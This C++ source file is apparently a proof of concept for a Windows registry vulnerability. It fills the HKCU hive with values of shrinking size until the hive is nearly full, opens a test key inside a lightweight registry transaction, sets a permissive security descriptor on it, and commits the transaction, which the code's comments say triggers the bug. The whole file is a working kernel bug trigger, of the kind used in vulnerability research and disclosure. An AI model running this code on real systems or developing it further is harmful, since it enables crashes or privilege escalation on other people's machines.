#define WIN32_NO_STATUS
#include <Windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>
#include <sddl.h>

#include <cstdio>

#pragma comment(lib, "ntdll.lib")

extern "C" {

NTSTATUS NTAPI NtCreateRegistryTransaction(PHANDLE, DWORD, POBJECT_ATTRIBUTES, DWORD);
NTSTATUS NTAPI NtCommitRegistryTransaction(HANDLE, DWORD);

}  // extern "C"

int main(int argc, char** argv) {
  //
  // Create a test key in the stable space of HKCU.
  //

  HKEY hTestKey;
  LONG st = RegCreateKeyExW(HKEY_CURRENT_USER,
                            L"Test",
                            0,
                            NULL,
                            0,
                            KEY_ALL_ACCESS,
                            NULL,
                            &hTestKey,
                            NULL);

  if (st != ERROR_SUCCESS) {
    printf("RegCreateKeyExW failed with error %d\n", st);
    return 1;
  }

  //
  // Pre-create the value nodes to minimize fragmentation of cells during
  // spraying, and to arrive at a stable key value index that won't be
  // reallocated later.
  //

  printf("Pre-creating registry spray values...\n");

  for (ULONG i = 0; i < 0x4000; i++) {
    WCHAR chValueName[10];
    _snwprintf_s(chValueName, sizeof(chValueName), L"%.8x", i);
    RegSetKeyValueW(hTestKey, NULL, chValueName, REG_BINARY, "AAAA", 4);
  }

  //
  // Allocate space in the hive by creating values of descending length, up
  // to the point where there is no room left in the hive for new allocations.
  //

  CONST ULONG kMaxValueSize = 1024 * 1024;  // 1 MiB
  PBYTE chValueData = (PBYTE)malloc(kMaxValueSize);

  if (chValueData == NULL) {
    printf("malloc(%u) failed\n", kMaxValueSize);
    return 1;
  }

  memset(chValueData, 0xCC, kMaxValueSize);

  printf("Spraying registry with size %u...\n", kMaxValueSize);

  ULONG ulSprayAllocSize = kMaxValueSize, ulTotalSpraySize = 0;
  for (ULONG i = 0; ulSprayAllocSize > 4; i++) {
    WCHAR chValueName[10];
    _snwprintf_s(chValueName, sizeof(chValueName), L"%.8x", i);

    st = RegSetKeyValueW(hTestKey,
                         NULL,
                         chValueName,
                         REG_BINARY,
                         chValueData,
                         ulSprayAllocSize - 4);

    if (st == ERROR_SUCCESS) {
      ulTotalSpraySize += ulSprayAllocSize;
    } else {
      ulSprayAllocSize /= 2;
      printf("Spraying registry with size %u...\n", ulSprayAllocSize);
    }
  }

  printf("Registry sprayed with a total of 0x%x bytes\n", ulTotalSpraySize);

  RegCloseKey(hTestKey);

  //
  // Create a lightweight registry transaction.
  //

  HANDLE hTrans;
  NTSTATUS Status = NtCreateRegistryTransaction(&hTrans,
                                                TRANSACTION_ALL_ACCESS,
                                                NULL,
                                                0);

  if (!NT_SUCCESS(Status)) {
    printf("NtCreateRegistryTransaction failed with error %.8x\n", Status);
    return 1;
  }

  //
  // Open the test key again, now in the scope of a transaction.
  //

  st = RegOpenKeyTransactedW(HKEY_CURRENT_USER,
                             L"Test",
                             0,
                             KEY_ALL_ACCESS,
                             &hTestKey,
                             hTrans,
                             NULL);

  if (st != ERROR_SUCCESS) {
    printf("RegOpenKeyTransactedW failed with error %d\n", st);
    return 1;
  }

  //
  // Set a new, unique security descriptor on the key in the scope of the
  // transaction.
  //

  PSECURITY_DESCRIPTOR lpSecurityDescriptor;

  CONST WCHAR* szSD = L"D:(A;;KA;;;WD)"; // Allow KEY_ALL_ACCESS for Everyone.

  if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(szSD,
         SDDL_REVISION_1,
         &lpSecurityDescriptor,
         NULL)) {
    printf("ConvertStringSecurityDescriptorToSecurityDescriptorW failed with "
           "error %u\n", GetLastError());
    return 1;
  }

  st = RegSetKeySecurity(hTestKey, DACL_SECURITY_INFORMATION, lpSecurityDescriptor);

  if (st != ERROR_SUCCESS) {
    printf("RegSetKeySecurity failed with error %d\n", st);
    return 1;
  }

  //
  // Commit the transaction, thus triggering the bug.
  //

  Status = NtCommitRegistryTransaction(hTrans, 0);

  if (!NT_SUCCESS(Status)) {
    printf("NtCommitRegistryTransaction failed with error %.8x\n", Status);
    return 1;
  }

  return 0;
}
